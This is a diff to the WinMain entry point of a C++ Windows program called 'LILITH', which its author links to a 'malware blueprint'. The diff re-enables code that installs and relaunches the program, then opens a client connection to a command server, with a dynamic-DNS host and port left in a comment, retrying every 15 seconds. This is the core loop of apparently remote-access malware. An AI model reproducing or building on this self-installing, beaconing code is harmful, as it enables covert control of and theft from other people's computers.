@@ -1,3 +1,13 @@
+/* 							LILITH 						*/
+/*				PROJECT CREATION DATE: 15.06.16			*/
+/* 				BY NICK RAZIBORSKY AKA WERKAMSUS		*/
+
+/*
+		
+			FEATURE IDEAS: 'GDRIVE\init0\malware blueprint.txt'
+
+*/
+
 /*
 
 					SETTINGS CAN BE EDITED IN "settings.cpp"
@@ -19,15 +29,15 @@ void testMB(std::string s)		//TEST FUNCTION
 
 #endif
 
-
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
 {
 	//VARIABLE SETUP
 	General::lpArguments = lpCmdLine;
-	/*
+	
 
 	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
 		return 0;
+
 
 	Client MyClient(Settings::serverIP, Settings::serverPort); //Client MyClient("nehcer.ddns.net", 38632);
 
@@ -43,8 +53,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 		Sleep(15000);
 	}
 
-	*/
-	//test stuff (WORKS \o/)
+	
 
 	return 0;
 }
